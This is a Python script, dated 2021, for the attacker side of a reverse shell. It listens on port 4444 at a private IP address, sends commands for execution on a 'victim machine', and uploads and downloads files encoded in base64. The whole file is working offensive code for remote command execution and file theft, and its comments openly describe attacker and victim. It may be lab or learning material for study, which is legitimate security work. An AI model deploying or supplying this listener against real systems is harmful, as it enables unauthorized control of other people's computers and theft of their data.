# Author: Yiğit Şık 06/11/2021

# This script will establish the reverse shell connection between attacker and victim machine
# Commands taken from attacker will be executed through this script on victim computer,
# then the results will be sent back

# Built-in Modules
import base64
import socket

# Third Party Modules
import json


class Listener:

    # Create and listen a tcp server socket with given ip and port values.
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)

        print("[+] Waiting for incoming connections")

        # Wait for first connection. This is a blocking code
        self.connection, address = listener.accept()
        print("[+] Got a connection" + str(address))

    # Send Messages as Json format for data integrity purposes
    # Sending data plainly might cause problems because end of the data stream cannot be known
    def send_data(self, data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    # Read data in 1024 byte chunks until json file is fully received
    def receive_data(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    # Send commands to be executed on victim machine
    def execute_remotely(self, command):
        self.send_data(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.receive_data()

    # Read and write files in base64 format to transfer bytes reliably.
    def read_file(self, path):
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read())
        except FileNotFoundError as e:
            print(e.strerror)

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    # Here we are sending commands to be executed on victim machine which their result
    # will be sent back to us
    def run(self):

        result = ""

        while True:

            # Input commands from terminal
            command = input(">> ")
            command = command.split(" ")

            # Get files from the victim machine
            if command[0] == "download":
                result = self.write_file(command[1], result)

            # Send files to the victim machine
            elif command[0] == "upload":
                file_content = self.read_file(command[1])
                if file_content is None:
                    continue
                command.append(file_content.decode())

            # Execute the input command and assign it to the result variable
            result = self.execute_remotely(command)

            # Print results to the terminal
            print(result)


# Create the server socket
my_listener = Listener("192.168.79.128", 4444)
my_listener.run()
